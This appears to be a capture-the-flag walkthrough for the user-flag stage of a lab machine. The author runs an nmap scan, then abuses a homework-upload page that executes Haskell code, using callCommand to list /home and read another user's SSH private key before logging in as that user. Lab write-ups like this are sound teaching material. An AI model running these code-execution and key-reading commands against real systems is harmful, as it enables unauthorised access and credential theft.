[< Back](../../README.md)

Found open ports with `nmap`:
```
  Discovered open port 22/tcp on [IP]
  Discovered open port 5001/tcp on [IP].
```

Going onto website: `[IP]:5001`:
<p><img src="src/user/main_site.jpg" width="750"></p>

Going to homework sub-page:
<p><img src="src/user/homework_site.jpg" width="750"></p>

You can upload haskell code that seems to get executed, let's try a simple hello world:
```haskell
import System.Process

main = callCommand "echo 'Hello, World!'"
```
<p><img src="src/user/basic_haskell_output.jpg" width="750"></p>

Okay we confirmed that we have achieved arbitrary code execution, let's try something more useful:
```haskell
main = callCommand "ls -laR /home" -- Recursively list all files in /home
```
Here are the interesting bits:
<p><img src="src/user/ls_home_users.jpg" width="750"></p>
<p><img src="src/user/ls_prof.jpg" width="750"></p>
There are 3 users:

- we currently are `flask`

- `haskell` doesn't seem interesting for the moment

- `prof` has the `user.txt`

Looking a little lower into our recursive search, we struck gold, `flask` has access to the `prof` `.ssh/` directory and it's contents.
<p><img src="src/user/ls_prof_ssh.jpg" width="750"></p>

```haskell
main = do
    callCommand "cat /home/prof/.ssh/id_rsa.pub"
    callCommand "cat /home/prof/.ssh/id_rsa"
```

<p><img src="src/user/cat_prof_credentials.jpg" width="750"></p>

Spoofing our identity and logging into the machine, we can now `cat user.txt`:
<p><img src="src/user/cat_user_txt.jpg" width="750"></p>
